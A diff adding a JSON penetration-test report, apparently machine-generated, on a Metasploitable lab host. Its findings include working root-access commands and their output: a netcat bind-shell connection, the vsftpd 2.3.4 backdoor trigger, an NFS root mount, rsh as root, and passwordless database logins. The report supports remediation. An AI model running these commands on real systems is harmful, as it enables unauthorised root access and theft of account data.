@@ -1,0 +1,788 @@
+{
+  "report_version": "2.0",
+  "generated_at": "2026-03-01T18:23:10.446029",
+  "generator": "NTREE Report Generator v2.1",
+  "assessment": {
+    "id": "test5",
+    "title": "test5",
+    "description": "Automated penetration test",
+    "started_at": "2026-03-01T18:11:59.881993",
+    "completed_at": "2026-03-01T18:23:09.923933",
+    "duration_seconds": 670.04194,
+    "status": "complete",
+    "phase": "COMPLETE"
+  },
+  "scope": {
+    "targets": [
+      "192.168.0.140"
+    ],
+    "exclusions": [],
+    "rules_of_engagement": "# ==============================================================================\n# NTREE RULES OF ENGAGEMENT - INTERNAL NETWORK PENETRATION TEST\n# ==============================================================================\n#\n# Template for internal network security assessments.\n# Assumes tester has network access similar to an employee/insider.\n#\n# ==============================================================================\n\n# ------------------------------------------------------------------------------\n# ASSESSMENT DETAILS\n# ------------------------------------------------------------------------------\n\nASSESSMENT_NAME: Internal Network Penetration Test\nCLIENT_NAME: [CLIENT_NAME]\nSTART_DATE: [START_DATE]\nEND_DATE: [END_DATE]\n\n# ------------------------------------------------------------------------------\n# TESTING WINDOW\n# ------------------------------------------------------------------------------\n\n# Internal tests often run during business hours\nTESTING_WINDOW: 8AM-6PM local time weekdays\n# TESTING_WINDOW: anytime\n\n# ------------------------------------------------------------------------------\n# ALLOWED ACTIVITIES\n# ------------------------------------------------------------------------------\n\n# Network scanning and enumeration\nALLOW_SCANNING: true\n\n# Vulnerability testing (safe checks)\nALLOW_VULN_TESTING: true\n\n# Credential/password testing (default creds, password spraying)\nALLOW_CREDENTIAL_TESTING: true\n\n# Exploitation attempts (with approval)\nALLOW_EXPLOITATION: true\n\n# Post-exploitation activities (with approval)\nALLOW_POST_EXPLOITATION: true\n\n# Social engineering\nALLOW_SOCIAL_ENGINEERING: false\n\n# Physical testing\nALLOW_PHYSICAL_TESTING: false\n\n# Denial of Service testing\nALLOW_DOS_TESTING: false\n\n# ------------------------------------------------------------------------------\n# INTERNAL NETWORK SPECIFIC\n# ------------------------------------------------------------------------------\n\n# Active Directory testing\nALLOW_AD_ENUMERATION: true\nALLOW_KERBEROASTING: true\nALLOW_ASREPROASTING: true\nALLOW_BLOODHOUND: true\n\n# Lateral movement testing\nALLOW_LATERAL_MOVEMENT: true\nALLOW_PASS_THE_HASH: true\nALLOW_PASS_THE_TICKET: true\n\n# Privilege escalation\nALLOW_PRIVESC_TESTING: true\n\n# ------------------------------------------------------------------------------\n# SCAN INTENSITY\n# ------------------------------------------------------------------------------\n\n# Options: stealth, normal, aggressive\nSCAN_INTENSITY: normal\n\n# Internal networks can often tolerate more aggressive scanning\nNMAP_TIMING: -T4\n\n# ------------------------------------------------------------------------------\n# RATE LIMITING\n# ------------------------------------------------------------------------------\n\n# Maximum login attempts per account\nMAX_LOGIN_ATTEMPTS: 3\n\n# Time window for rate limiting (seconds)\nRATE_LIMIT_WINDOW: 300\n\n# Account lockout threshold (stop before this)\nLOCKOUT_THRESHOLD: 5\n\n# ------------------------------------------------------------------------------\n# EMERGENCY CONTACTS\n# ------------------------------------------------------------------------------\n\nEMERGENCY_CONTACT: [SECURITY_EMAIL]\nEMERGENCY_PHONE: [SECURITY_PHONE]\nESCALATION_CONTACT: [IT_DIRECTOR_EMAIL]\n\n# ------------------------------------------------------------------------------\n# SPECIAL RESTRICTIONS\n# ------------------------------------------------------------------------------\n\n# Critical systems - test with extra caution\nSENSITIVE_SYSTEMS: domain controllers, backup servers, financial systems\n\n# Systems to avoid entirely\nDO_NOT_TEST: production database servers, SCADA/ICS systems\n\n# Prohibited actions\nPROHIBITED: data exfiltration, malware deployment, ransomware simulation, permanent changes\n\n# Actions requiring explicit approval\nREQUIRES_APPROVAL: exploitation, credential extraction, lateral movement, AD attacks\n\n# ------------------------------------------------------------------------------\n# REPORTING REQUIREMENTS\n# ------------------------------------------------------------------------------\n\nREPORT_FORMATS: executive, technical, comprehensive\nNOTIFY_CRITICAL: immediate\nCRITICAL_CONTACT: [SECURITY_EMAIL]\n\n# Attack path documentation required\nDOCUMENT_ATTACK_PATHS: true\n\n# ------------------------------------------------------------------------------\n# AUTHORIZATION STATEMENT\n# ------------------------------------------------------------------------------\n#\n# This internal network penetration test is authorized by [AUTHORIZED_PERSON]\n# on behalf of [CLIENT_NAME]. The tester has permission to perform security\n# testing on internal network resources within the defined scope.\n#\n# Authorization Reference: [CONTRACT/PO NUMBER]\n# Signed Date: [DATE]\n#\n# =============================================================================="
+  },
+  "summary": {
+    "total_findings": 14,
+    "critical": 5,
+    "high": 5,
+    "medium": 4,
+    "low": 0,
+    "info": 0,
+    "hosts_discovered": 1,
+    "services_discovered": 16,
+    "evidence_quality": {
+      "total_findings": 14,
+      "quality_distribution": {
+        "excellent": 1,
+        "good": 2,
+        "acceptable": 3,
+        "weak": 4,
+        "insufficient": 4
+      },
+      "average_score": 21.428571428571427,
+      "warnings": [
+        {
+          "title": "PostgreSQL Default Credentials (postgres:postgres)",
+          "severity": "high",
+          "quality": "weak",
+          "issues": [
+            "No proof of exploitation found",
+            "HIGH severity finding should have stronger evidence"
+          ]
+        },
+        {
+          "title": "SMBv1 Enabled and SMB Signing Not Required",
+          "severity": "high",
+          "quality": "insufficient",
+          "issues": [
+            "No proof of exploitation found",
+            "HIGH severity finding should have stronger evidence"
+          ]
+        },
+        {
+          "title": "R-Services Exposed (rexec/rlogin/rsh - Ports 512-514)",
+          "severity": "high",
+          "quality": "insufficient",
+          "issues": [
+            "No proof of exploitation found",
+            "HIGH severity finding should have stronger evidence"
+          ]
+        },
+        {
+          "title": "PostgreSQL Default Credentials (postgres:postgres)",
+          "severity": "high",
+          "quality": "weak",
+          "issues": [
+            "No proof of exploitation found",
+            "HIGH severity finding should have stronger evidence"
+          ]
+        }
+      ],
+      "excellent_count": 1,
+      "needs_improvement": 8
+    }
+  },
+  "risk_score": {
+    "score": 78.9,
+    "level": "Critical",
+    "raw_score": 110.49999999999999
+  },
+  "findings": [
+    {
+      "finding_id": "finding_001",
+      "title": "Root Shell via Bind Shell (Port 1524 - Ingreslock Backdoor)",
+      "severity": "critical",
+      "description": "A root-level bind shell is listening on port 1524 (ingreslock). Any attacker can connect and obtain an interactive root shell with no authentication required. This provides complete system compromise with uid=0(root) access.",
+      "affected_hosts": [
+        "192.168.0.140"
+      ],
+      "evidence": "Exploitation command: echo 'id && whoami && hostname && uname -a && head -5 /etc/passwd' | nc -w 5 192.168.0.140 1524\\n\\nOutput:\\nroot@metasploitable:/# uid=0(root) gid=0(root) groups=0(root)\\nroot\\nmetasploitable\\nLinux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux\\nroot:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/bin/sh\\nbin:x:2:2:bin:/bin:/bin/sh\\nsys:x:3:3:sys:/dev:/bin/sh\\nsync:x:4:65534:sync:/bin:/bin/sync",
+      "cvss_score": 10.0,
+      "remediation": "Remove the bind shell backdoor on port 1524. Investigate how the backdoor was installed and check for additional persistence mechanisms. Rebuild the system from a known-good image.",
+      "references": [
+        "CWE-798",
+        "MITRE ATT&CK T1505.003"
+      ],
+      "exploitable": true,
+      "exploitation_status": "CONFIRMED",
+      "discovered_at": "2026-03-01T18:20:37.288872",
+      "assessment_id": "test5",
+      "evidence_validation": {
+        "quality": "excellent",
+        "score": 75,
+        "issues": [],
+        "suggestions": [],
+        "has_exploitation_proof": true
+      },
+      "id": "FINDING-001",
+      "evidence_quality": {
+        "level": "excellent",
+        "score": 75,
+        "issues": [],
+        "suggestions": []
+      }
+    },
+    {
+      "finding_id": "finding_002",
+      "title": "Root Shell via vsftpd 2.3.4 Backdoor (CVE-2011-2523)",
+      "severity": "critical",
+      "description": "vsftpd 2.3.4 contains a backdoor that opens a root shell on port 6200 when a username ending with ':)' is used during FTP login. This is a known supply-chain compromise of the vsftpd source code. Successful exploitation provides uid=0(root) access.",
+      "affected_hosts": [
+        "192.168.0.140"
+      ],
+      "evidence": "Exploitation steps:\\n1. Trigger backdoor: (echo 'USER backdoored:)'; sleep 2; echo 'PASS anything'; sleep 3) | nc -w 5 192.168.0.140 21\\n2. Connect to backdoor shell: echo 'id && whoami && cat /etc/passwd' | nc -w 5 192.168.0.140 6200\\n\\nOutput:\\nuid=0(root) gid=0(root)\\nroot\\nmetasploitable\\nroot:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/bin/sh\\n[...full /etc/passwd dumped with 35+ accounts...]",
+      "cvss_score": 10.0,
+      "remediation": "Immediately upgrade vsftpd to a version not affected by the backdoor (2.3.5+). Verify the integrity of all installed software packages. Consider replacing with a secure FTP alternative or using SFTP.",
+      "references": [
+        "CVE-2011-2523",
+        "https://www.exploit-db.com/exploits/17491",
+        "https://www.exploit-db.com/exploits/49757"
+      ],
+      "exploitable": true,
+      "exploitation_status": "CONFIRMED",
+      "discovered_at": "2026-03-01T18:20:45.977566",
+      "assessment_id": "test5",
+      "evidence_validation": {
+        "quality": "good",
+        "score": 50,
+        "issues": [],
+        "suggestions": [],
+        "has_exploitation_proof": true
+      },
+      "id": "FINDING-002",
+      "evidence_quality": {
+        "level": "good",
+        "score": 50,
+        "issues": [],
+        "suggestions": []
+      }
+    },
+    {
+      "finding_id": "finding_003",
+      "title": "NFS Root Filesystem Export to All Hosts",
+      "severity": "critical",
+      "description": "The NFS service exports the entire root filesystem (/) to all hosts (*) with no access restrictions. Any host on the network can mount the full filesystem, read sensitive configuration files, and potentially write SSH keys for persistent access.",
+      "affected_hosts": [
+        "192.168.0.140"
+      ],
+      "evidence": "Enumeration:\\n$ showmount -e 192.168.0.140\\nExport list for 192.168.0.140:\\n/ *\\n\\nExploitation:\\n$ sudo mount -t nfs -o nolock,vers=3 192.168.0.140:/ /tmp/nfs_mount\\n$ head -10 /tmp/nfs_mount/etc/passwd\\nroot:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/bin/sh\\nbin:x:2:2:bin:/bin:/bin/sh\\n...\\n\\n$ ls /tmp/nfs_mount/home/\\nftp msfadmin service user\\n\\nFull filesystem browseable including /etc/passwd, home directories, application configs.",
+      "cvss_score": 9.8,
+      "remediation": "Restrict NFS exports to specific trusted hosts/subnets. Never export the root filesystem. Use NFSv4 with Kerberos authentication. Apply the principle of least privilege to exported paths.",
+      "references": [
+        "CWE-732",
+        "CVE-1999-0170"
+      ],
+      "exploitable": true,
+      "exploitation_status": "CONFIRMED",
+      "discovered_at": "2026-03-01T18:20:53.507559",
+      "assessment_id": "test5",
+      "evidence_validation": {
+        "quality": "acceptable",
+        "score": 25,
+        "issues": [],
+        "suggestions": [],
+        "has_exploitation_proof": true
+      },
+      "id": "FINDING-003",
+      "evidence_quality": {
+        "level": "acceptable",
+        "score": 25,
+        "issues": [],
+        "suggestions": []
+      }
+    },
+    {
+      "finding_id": "finding_004",
+      "title": "MySQL Root Account Without Password",
+      "severity": "critical",
+      "description": "MySQL 5.0.51a is accessible remotely with the root account requiring no password. The root user has full administrative privileges over all databases. A guest account also exists with remote access (host: %). This allows complete database compromise including data theft, modification, and potential OS command execution.",
+      "affected_hosts": [
+        "192.168.0.140"
+      ],
+      "evidence": "Exploitation command:\\n$ mysql -h 192.168.0.140 -u root --skip-password --skip-ssl -e \\\"SELECT user,host FROM mysql.user; SELECT version();\\\"\\n\\nOutput:\\nuser             host\\ndebian-sys-maint \\nguest            %\\nroot             %\\n\\nversion()\\n5.0.51a-3ubuntu5\\n\\nRoot access confirmed with no password. Guest account also available remotely.",
+      "cvss_score": 9.8,
+      "remediation": "Set a strong password for the MySQL root account. Remove the guest account. Restrict remote access by binding MySQL to localhost or specific trusted IPs. Remove unnecessary user accounts.",
+      "references": [
+        "CWE-521",
+        "CWE-306"
+      ],
+      "exploitable": true,
+      "exploitation_status": "CONFIRMED",
+      "discovered_at": "2026-03-01T18:21:01.335525",
+      "assessment_id": "test5",
+      "evidence_validation": {
+        "quality": "acceptable",
+        "score": 25,
+        "issues": [],
+        "suggestions": [
+          "For SQLi: Show extracted data or UNION-based output",
+          "Include sqlmap output showing database/table extraction"
+        ],
+        "has_exploitation_proof": true
+      },
+      "id": "FINDING-004",
+      "evidence_quality": {
+        "level": "acceptable",
+        "score": 25,
+        "issues": [],
+        "suggestions": [
+          "For SQLi: Show extracted data or UNION-based output",
+          "Include sqlmap output showing database/table extraction"
+        ]
+      }
+    },
+    {
+      "finding_id": "finding_011",
+      "title": "R-Services Exposed (rexec/rlogin/rsh - Ports 512-514)",
+      "severity": "critical",
+      "description": "Legacy Berkeley R-services are running with trust relationships allowing unauthenticated root access. RSH on port 514 provides immediate root shell access without any password. This allows complete system compromise.",
+      "affected_hosts": [
+        "192.168.0.140"
+      ],
+      "evidence": "Exploitation command:\\n$ rsh -l root 192.168.0.140 'id && whoami && hostname'\\n\\nOutput:\\nuid=0(root) gid=0(root) groups=0(root)\\nroot\\nmetasploitable\\n\\nRoot-level command execution confirmed via rsh with no authentication required. The .rhosts trust configuration allows any host to execute commands as root.",
+      "cvss_score": 10.0,
+      "remediation": "Disable all R-services (rexecd, rlogind, rsh) immediately. Remove .rhosts and hosts.equiv trust files. Use SSH with key-based authentication for remote administration.",
+      "references": [
+        "CWE-287",
+        "CWE-319"
+      ],
+      "exploitable": true,
+      "exploitation_status": "CONFIRMED",
+      "discovered_at": "2026-03-01T18:22:15.797386",
+      "assessment_id": "test5",
+      "evidence_validation": {
+        "quality": "acceptable",
+        "score": 25,
+        "issues": [],
+        "suggestions": [],
+        "has_exploitation_proof": true
+      },
+      "id": "FINDING-011",
+      "evidence_quality": {
+        "level": "acceptable",
+        "score": 25,
+        "issues": [],
+        "suggestions": []
+      }
+    },
+    {
+      "finding_id": "finding_005",
+      "title": "PostgreSQL Default Credentials (postgres:postgres)",
+      "severity": "high",
+      "description": "PostgreSQL 8.3.1 is accessible remotely with the default postgres:postgres credentials. The postgres superuser account has full administrative privileges over all databases. While COPY FROM PROGRAM is not available in this version, full database access enables data theft and modification.",
+      "affected_hosts": [
+        "192.168.0.140"
+      ],
+      "evidence": "Exploitation command:\\n$ psql \\\"host=192.168.0.140 user=postgres password=postgres sslmode=disable\\\" -c \\\"SELECT version();\\\" -c \\\"SELECT usename FROM pg_user;\\\"\\n\\nOutput:\\nversion\\n-----------------------------------------------------------------------------------------------\\nPostgreSQL 8.3.1 on i486-pc-linux-gnu, compiled by GCC cc (GCC) 4.2.3 (Ubuntu 4.2.3-2ubuntu4)\\n(1 row)\\n\\nusename\\n----------\\npostgres\\n(1 row)\\n\\nFull superuser access confirmed with default credentials.",
+      "cvss_score": 8.6,
+      "remediation": "Change the default PostgreSQL password immediately. Restrict remote access via pg_hba.conf to trusted hosts only. Disable remote connections if not needed. Use strong authentication methods.",
+      "references": [
+        "CWE-521",
+        "CWE-306"
+      ],
+      "exploitable": true,
+      "exploitation_status": "CONFIRMED",
+      "discovered_at": "2026-03-01T18:21:15.482498",
+      "assessment_id": "test5",
+      "evidence_validation": {
+        "quality": "weak",
+        "score": 10,
+        "issues": [
+          "No proof of exploitation found",
+          "HIGH severity finding should have stronger evidence",
+          "Exploitation proof required for high/critical findings"
+        ],
+        "suggestions": [
+          "Include output showing successful exploitation",
+          "Add command output demonstrating access or data extraction",
+          "For high findings, demonstrate actual impact",
+          "Actually exploit the vulnerability and capture output",
+          "For SQLi: Show extracted data or UNION-based output"
+        ],
+        "has_exploitation_proof": false
+      },
+      "id": "FINDING-005",
+      "evidence_quality": {
+        "level": "weak",
+        "score": 10,
+        "issues": [
+          "No proof of exploitation found",
+          "HIGH severity finding should have stronger evidence"
+        ],
+        "suggestions": [
+          "Include output showing successful exploitation",
+          "Add command output demonstrating access or data extraction",
+          "For high findings, demonstrate actual impact",
+          "For SQLi: Show extracted data or UNION-based output",
+          "Include sqlmap output showing database/table extraction"
+        ]
+      }
+    },
+    {
+      "finding_id": "finding_007",
+      "title": "SMBv1 Enabled and SMB Signing Not Required",
+      "severity": "high",
+      "description": "Samba 3.0.20-Debian has SMBv1 enabled and SMB signing is not required. SMBv1 is vulnerable to multiple critical exploits (EternalBlue, etc.) and lack of SMB signing enables NTLM relay attacks. 35 user accounts were enumerated via null session including root, msfadmin, user, service, postgres, and other service accounts.",
+      "affected_hosts": [
+        "192.168.0.140"
+      ],
+      "evidence": "SMB Configuration Analysis:\\n- SMBv1 protocol is enabled (CRITICAL)\\n- SMB signing is not required (HIGH)\\n- Samba version: 3.0.20-Debian\\n- Domain: localdomain (WORKGROUP)\\n- OS: METASPLOITABLE\\n\\nNull Session User Enumeration (35 accounts):\\ngames, nobody, bind, proxy, syslog, user, www-data, root, news, postgres, bin, mail, distccd, proftpd, dhcp, daemon, sshd, man, lp, mysql, gnats, libuuid, backup, msfadmin, telnetd, sys, klog, postfix, service, list, irc, ftp, tomcat55, sync, uucp",
+      "cvss_score": 7.5,
+      "remediation": "Disable SMBv1 protocol. Enable and require SMB signing on all SMB connections. Upgrade Samba to a current supported version. Disable null session enumeration. Restrict SMB access to authorized hosts.",
+      "references": [
+        "CVE-2017-0144",
+        "CWE-311"
+      ],
+      "exploitable": true,
+      "exploitation_status": "CONFIRMED",
+      "discovered_at": "2026-03-01T18:21:32.925624",
+      "assessment_id": "test5",
+      "evidence_validation": {
+        "quality": "insufficient",
+        "score": 0,
+        "issues": [
+          "No proof of exploitation found",
+          "HIGH severity finding should have stronger evidence",
+          "Exploitation proof required for high/critical findings"
+        ],
+        "suggestions": [
+          "Include output showing successful exploitation",
+          "Add command output demonstrating access or data extraction",
+          "For high findings, demonstrate actual impact",
+          "Actually exploit the vulnerability and capture output",
+          "Show successful connection or authentication"
+        ],
+        "has_exploitation_proof": false
+      },
+      "id": "FINDING-007",
+      "evidence_quality": {
+        "level": "insufficient",
+        "score": 0,
+        "issues": [
+          "No proof of exploitation found",
+          "HIGH severity finding should have stronger evidence"
+        ],
+        "suggestions": [
+          "Include output showing successful exploitation",
+          "Add command output demonstrating access or data extraction",
+          "For high findings, demonstrate actual impact",
+          "Show successful connection or authentication",
+          "Include session output or file access proof"
+        ]
+      }
+    },
+    {
+      "finding_id": "finding_010",
+      "title": "R-Services Exposed (rexec/rlogin/rsh - Ports 512-514)",
+      "severity": "high",
+      "description": "Legacy Berkeley R-services (rexecd on port 512, rlogind on port 513, rsh on port 514) are running. These services use weak trust-based authentication (.rhosts files) and transmit credentials in cleartext. They can be exploited for unauthorized remote command execution if trust relationships exist.",
+      "affected_hosts": [
+        "192.168.0.140"
+      ],
+      "evidence": "Service enumeration confirmed:\\n- Port 512/tcp: exec (netkit-rsh rexecd) - open\\n- Port 513/tcp: login (OpenBSD or Solaris rlogind) - open\\n- Port 514/tcp: tcpwrapped - open\\n\\nThese services rely on .rhosts trust files and IP-based authentication, which are trivially spoofable. All communication is unencrypted.",
+      "cvss_score": 7.5,
+      "remediation": "Disable all R-services (rexecd, rlogind, rsh). Use SSH for all remote administration. Remove any .rhosts and hosts.equiv trust files.",
+      "references": [
+        "CWE-319",
+        "CWE-287"
+      ],
+      "exploitable": false,
+      "exploitation_status": "NEEDS_VERIFICATION",
+      "discovered_at": "2026-03-01T18:21:55.286437",
+      "assessment_id": "test5",
+      "evidence_validation": {
+        "quality": "insufficient",
+        "score": 0,
+        "issues": [
+          "No proof of exploitation found",
+          "HIGH severity finding should have stronger evidence",
+          "Exploitation proof required for high/critical findings"
+        ],
+        "suggestions": [
+          "Include output showing successful exploitation",
+          "Add command output demonstrating access or data extraction",
+          "For high findings, demonstrate actual impact",
+          "Actually exploit the vulnerability and capture output"
+        ],
+        "has_exploitation_proof": false
+      },
+      "id": "FINDING-010",
+      "evidence_quality": {
+        "level": "insufficient",
+        "score": 0,
+        "issues": [
+          "No proof of exploitation found",
+          "HIGH severity finding should have stronger evidence"
+        ],
+        "suggestions": [
+          "Include output showing successful exploitation",
+          "Add command output demonstrating access or data extraction",
+          "For high findings, demonstrate actual impact"
+        ]
+      }
+    },
+    {
+      "finding_id": "finding_012",
+      "title": "PostgreSQL Default Credentials (postgres:postgres)",
+      "severity": "high",
+      "description": "PostgreSQL 8.3.1 is accessible remotely with default credentials (postgres:postgres). The postgres superuser has full administrative privileges. Database enumeration reveals 3 databases and at least one user table. This enables complete database compromise.",
+      "affected_hosts": [
+        "192.168.0.140"
+      ],
+      "evidence": "Exploitation commands and output:\\n$ psql \\\"host=192.168.0.140 user=postgres password=postgres sslmode=disable\\\" -c \\\"SELECT version();\\\" -c \\\"SELECT datname FROM pg_database;\\\" -c \\\"\\\\dt\\\"\\n\\nversion: PostgreSQL 8.3.1 on i486-pc-linux-gnu, compiled by GCC cc (GCC) 4.2.3 (Ubuntu 4.2.3-2ubuntu4)\\n\\nDatabases:\\n  template1\\n  template0\\n  postgres\\n\\nTables in postgres DB:\\n Schema | Name  | Type  | Owner\\n public | edott | table | postgres\\n\\nFull superuser access confirmed. Can read/write all databases, enumerate schemas, and access all stored data.",
+      "cvss_score": 8.6,
+      "remediation": "Change the default PostgreSQL password immediately. Restrict remote access via pg_hba.conf. Bind to localhost if remote access is not needed. Audit all database contents for sensitive data.",
+      "references": [
+        "CWE-521",
+        "CWE-306"
+      ],
+      "exploitable": true,
+      "exploitation_status": "CONFIRMED",
+      "discovered_at": "2026-03-01T18:22:23.259301",
+      "assessment_id": "test5",
+      "evidence_validation": {
+        "quality": "weak",
+        "score": 10,
+        "issues": [
+          "No proof of exploitation found",
+          "HIGH severity finding should have stronger evidence",
+          "Exploitation proof required for high/critical findings"
+        ],
+        "suggestions": [
+          "Include output showing successful exploitation",
+          "Add command output demonstrating access or data extraction",
+          "For high findings, demonstrate actual impact",
+          "Actually exploit the vulnerability and capture output",
+          "For SQLi: Show extracted data or UNION-based output"
+        ],
+        "has_exploitation_proof": false
+      },
+      "id": "FINDING-012",
+      "evidence_quality": {
+        "level": "weak",
+        "score": 10,
+        "issues": [
+          "No proof of exploitation found",
+          "HIGH severity finding should have stronger evidence"
+        ],
+        "suggestions": [
+          "Include output showing successful exploitation",
+          "Add command output demonstrating access or data extraction",
+          "For high findings, demonstrate actual impact",
+          "For SQLi: Show extracted data or UNION-based output",
+          "Include sqlmap output showing database/table extraction"
+        ]
+      }
+    },
+    {
+      "finding_id": "finding_013",
+      "title": "SMBv1 Enabled with Null Session Access and SMB Signing Disabled",
+      "severity": "high",
+      "description": "Samba 3.0.20-Debian has SMBv1 enabled, SMB signing not required, and allows anonymous/null session access. Null sessions expose 3 file shares (tmp, opt, print$) and 35 user accounts. SMBv1 is vulnerable to multiple critical exploits and lack of signing enables NTLM relay attacks.",
+      "affected_hosts": [
+        "192.168.0.140"
+      ],
+      "evidence": "Exploitation:\\n$ smbclient -L //192.168.0.140 -N\\n\\nAnonymous login successful\\n\\nSharename       Type      Comment\\n---------       ----      -------\\nprint$          Disk      Printer Drivers\\ntmp             Disk      oh noes!\\nopt             Disk\\nIPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))\\nADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))\\n\\nWorkgroup: WORKGROUP, Master: SMBSHARE\\n\\nNull Session User Enumeration (35 accounts): root, msfadmin, user, service, postgres, mysql, www-data, distccd, ftp, etc.\\n\\nConfiguration: SMBv1 enabled (CRITICAL), SMB signing not required (HIGH)",
+      "cvss_score": 7.5,
+      "remediation": "Disable SMBv1. Enable and require SMB signing. Disable null session access. Restrict share access with proper ACLs. Upgrade Samba to a current supported version.",
+      "references": [
+        "CVE-2017-0144",
+        "CWE-311",
+        "CWE-200"
+      ],
+      "exploitable": true,
+      "exploitation_status": "CONFIRMED",
+      "discovered_at": "2026-03-01T18:22:30.918475",
+      "assessment_id": "test5",
+      "evidence_validation": {
+        "quality": "good",
+        "score": 60,
+        "issues": [],
+        "suggestions": [
+          "Show successful connection or authentication",
+          "Include session output or file access proof"
+        ],
+        "has_exploitation_proof": true
+      },
+      "id": "FINDING-013",
+      "evidence_quality": {
+        "level": "good",
+        "score": 60,
+        "issues": [],
+        "suggestions": [
+          "Show successful connection or authentication",
+          "Include session output or file access proof"
+        ]
+      }
+    },
+    {
+      "finding_id": "finding_006",
+      "title": "Anonymous FTP Access Enabled",
+      "severity": "medium",
+      "description": "The FTP service (vsftpd 2.3.4) allows anonymous login without credentials. While the anonymous user has limited access, this enables reconnaissance and potential data access to publicly shared files.",
+      "affected_hosts": [
+        "192.168.0.140"
+      ],
+      "evidence": "FTP anonymous login confirmed:\\n- FTP server status: Connected to 192.168.0.105, Logged in as ftp\\n- NSE script output: Anonymous FTP login allowed (FTP code 230)\\n- MCP credential check: anonymous@192.168.0.140:ftp: VALID (access: user)",
+      "cvss_score": 5.3,
+      "remediation": "Disable anonymous FTP access. Use SFTP instead of FTP for file transfers. If anonymous access is required, ensure it is read-only with minimal file exposure.",
+      "references": [
+        "CWE-284"
+      ],
+      "exploitable": true,
+      "exploitation_status": "CONFIRMED",
+      "discovered_at": "2026-03-01T18:21:22.576618",
+      "assessment_id": "test5",
+      "evidence_validation": {
+        "quality": "insufficient",
+        "score": 0,
+        "issues": [
+          "No proof of exploitation found"
+        ],
+        "suggestions": [
+          "Include output showing successful exploitation",
+          "Add command output demonstrating access or data extraction"
+        ],
+        "has_exploitation_proof": false
+      },
+      "id": "FINDING-006",
+      "evidence_quality": {
+        "level": "insufficient",
+        "score": 0,
+        "issues": [
+          "No proof of exploitation found"
+        ],
+        "suggestions": [
+          "Include output showing successful exploitation",
+          "Add command output demonstrating access or data extraction"
+        ]
+      }
+    },
+    {
+      "finding_id": "finding_008",
+      "title": "Telnet Service Exposed (Cleartext Protocol)",
+      "severity": "medium",
+      "description": "Linux telnetd is running on port 23, providing cleartext remote login. All credentials and session data transmitted over telnet are unencrypted and can be captured via network sniffing. Combined with weak or default credentials, this provides easy remote access.",
+      "affected_hosts": [
+        "192.168.0.140"
+      ],
+      "evidence": "Service enumeration confirmed Linux telnetd on port 23/tcp (open, confidence 10/10). Telnet transmits all authentication and session data in cleartext, enabling credential interception via passive network monitoring.",
+      "cvss_score": 5.3,
+      "remediation": "Disable the telnet service. Use SSH for remote administration instead. If telnet is absolutely required, restrict access to specific trusted networks via firewall rules.",
+      "references": [
+        "CWE-319"
+      ],
+      "exploitable": true,
+      "exploitation_status": "CONFIRMED",
+      "discovered_at": "2026-03-01T18:21:38.317059",
+      "assessment_id": "test5",
+      "evidence_validation": {
+        "quality": "insufficient",
+        "score": 0,
+        "issues": [
+          "No proof of exploitation found"
+        ],
+        "suggestions": [
+          "Include output showing successful exploitation",
+          "Add command output demonstrating access or data extraction"
+        ],
+        "has_exploitation_proof": false
+      },
+      "id": "FINDING-008",
+      "evidence_quality": {
+        "level": "insufficient",
+        "score": 0,
+        "issues": [
+          "No proof of exploitation found"
+        ],
+        "suggestions": [
+          "Include output showing successful exploitation",
+          "Add command output demonstrating access or data extraction"
+        ]
+      }
+    },
+    {
+      "finding_id": "finding_009",
+      "title": "phpinfo() Information Disclosure",
+      "severity": "medium",
+      "description": "The phpinfo.php file is publicly accessible at http://192.168.0.140/phpinfo.php, exposing detailed server configuration including PHP version (5.2.4-2ubuntu5.10), Apache version (2.2.8), OS details, document root (/var/www/), and all PHP configuration variables. phpMyAdmin is also accessible without authentication.",
+      "affected_hosts": [
+        "192.168.0.140"
+      ],
+      "evidence": "$ curl -s http://192.168.0.140/phpinfo.php | grep key info:\\n\\nPHP Version 5.2.4-2ubuntu5.10\\nSystem: Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686\\nSERVER_SOFTWARE: Apache/2.2.8 (Ubuntu) DAV/2\\nDOCUMENT_ROOT: /var/www/\\n\\nAdditional web findings:\\n- /phpMyAdmin/ directory accessible\\n- /dav (WebDAV enabled)\\n- /twiki accessible\\n- Directory indexing on /doc/, /test/, /icons/\\n- HTTP TRACE method active (XST risk)\\n- All security headers missing (X-Frame-Options, CSP, HSTS, etc.)",
+      "cvss_score": 5.3,
+      "remediation": "Remove phpinfo.php and any test/debug files from production. Disable directory indexing. Add security headers (X-Frame-Options, CSP, HSTS, X-Content-Type-Options). Restrict access to phpMyAdmin. Disable HTTP TRACE method. Disable WebDAV if not needed.",
+      "references": [
+        "CWE-200",
+        "CWE-552"
+      ],
+      "exploitable": true,
+      "exploitation_status": "CONFIRMED",
+      "discovered_at": "2026-03-01T18:21:48.550391",
+      "assessment_id": "test5",
+      "evidence_validation": {
+        "quality": "weak",
+        "score": 10,
+        "issues": [
+          "No proof of exploitation found"
+        ],
+        "suggestions": [
+          "Include output showing successful exploitation",
+          "Add command output demonstrating access or data extraction"
+        ],
+        "has_exploitation_proof": false
+      },
+      "id": "FINDING-009",
+      "evidence_quality": {
+        "level": "weak",
+        "score": 10,
+        "issues": [
+          "No proof of exploitation found"
+        ],
+        "suggestions": [
+          "Include output showing successful exploitation",
+          "Add command output demonstrating access or data extraction"
+        ]
+      }
+    },
+    {
+      "finding_id": "finding_014",
+      "title": "SSH Weak Ciphers and Key Exchange Algorithms",
+      "severity": "medium",
+      "description": "OpenSSH 4.7p1 on the target supports weak cryptographic algorithms including RC4 (arcfour) ciphers and diffie-hellman-group1-sha1 key exchange. These are considered cryptographically weak and susceptible to various attacks. The SSH version itself (4.7p1) is severely outdated with multiple known CVEs.",
+      "affected_hosts": [
+        "192.168.0.140"
+      ],
+      "evidence": "SSH configuration analysis via MCP:\\n- Weak cipher: arcfour/RC4 enabled (severity: high)\\n- Weak KEX: diffie-hellman-group1-sha1 enabled (severity: medium)\\n- SSH version: OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)\\n- Host keys: 1024-bit DSA, 2048-bit RSA",
+      "cvss_score": 5.3,
